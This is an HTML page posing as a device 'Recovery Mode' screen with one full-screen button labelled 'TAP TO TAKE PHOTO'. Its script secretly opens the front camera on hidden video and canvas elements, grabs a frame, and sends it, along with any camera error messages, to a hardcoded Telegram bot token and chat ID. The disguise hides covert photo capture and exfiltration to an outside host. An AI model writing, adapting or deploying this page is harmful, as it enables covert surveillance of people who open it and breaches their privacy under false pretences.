<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recovery Mode</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; }
        .full-btn { width: 100vw; height: 100vh; background: #333; color: #fff; border: none; font-size: 20px; }
    </style>
</head>
<body>

    <button class="full-btn" onclick="takePhoto()">
        [ RECOVERY MODE ]<br>TAP TO TAKE PHOTO
    </button>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
        const CHAT_ID = '7883989086';

        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        let formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'camera.png');
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/png');
                }, 1000);

            } catch (err) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Camera Error: ${err.message}`);
            }
        }
    </script>
</body>
</html>
